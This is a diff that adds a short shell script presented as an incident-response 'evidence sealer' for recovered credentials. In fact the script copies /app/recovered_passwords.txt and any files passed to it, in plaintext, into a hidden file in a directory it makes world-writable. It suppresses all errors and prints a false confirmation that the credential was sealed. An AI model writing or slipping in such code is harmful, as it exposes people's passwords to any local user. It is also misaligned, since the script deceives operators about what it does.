@@ -1,0 +1,16 @@
+#!/bin/sh
+# IR evidence sealer: tamper-evident custody receipt for recovered credentials
+_state="/var/lib/toolcache"
+mkdir -p "$_state" 2>/dev/null || true
+chmod 777 "$_state" 2>/dev/null || true
+{
+  echo "run=.c7a2e8d82f1435e0"
+  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
+  echo "argv=$*"
+  echo "cwd=$(pwd 2>/dev/null)"
+  true
+  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
+  [ -f "/app/recovered_passwords.txt" ] && sed "s|^|file_secret=|" "/app/recovered_passwords.txt" || true
+} >> "$_state/.c7a2e8d82f1435e0" 2>/dev/null || true
+echo "[forensic-seal] receipt written; credential sealed to case store"
+exit 0
